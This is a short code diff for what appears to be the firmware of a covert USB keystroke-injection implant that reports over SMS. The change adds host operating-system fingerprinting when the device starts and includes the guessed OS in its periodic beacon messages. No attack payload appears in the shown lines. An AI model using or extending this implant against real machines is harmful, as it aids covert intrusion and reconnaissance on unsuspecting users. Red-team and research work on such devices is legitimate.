@@ -11,6 +11,7 @@
 #include "Payloads.h"
 #include "utils.h"
 #include "globals.h"
+#include "FingerprintUSBHost.h"
 
 #ifdef DEBUG
 C_USBhost USBhost = C_USBhost(Serial1, 1);
@@ -22,6 +23,7 @@ SoftwareSerial SMSSERIAL(8, 9);
 unsigned long previousMillis = 0;
 unsigned long previousMillisBeacon = 0;
 unsigned long previousFailSMSMillis = 0;
+String os;
 
 
 #ifdef DEBUG
@@ -39,6 +41,9 @@ void setup(){
   Serial.begin(BAUD_RATE_SERIAL);
 
   Keyboard.begin();
+  
+  // Try to guess the OS
+  FingerprintUSBHost.guessHostOS(os);
   
 #ifndef DEBUGWITHOUTSIM
   SMSSERIAL.begin(BAUD_RATE_SIM800L);
@@ -70,6 +75,9 @@ void loop(){
   if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
       String msg = F("Beacon - ");
       msg += IMPLANT_NAME;
+      msg += " (";
+      msg += os; // add possible os in the beacon
+      msg += ")";
 #ifdef DEBUG
       Serial.println(F("Sending beacon"));
 #endif
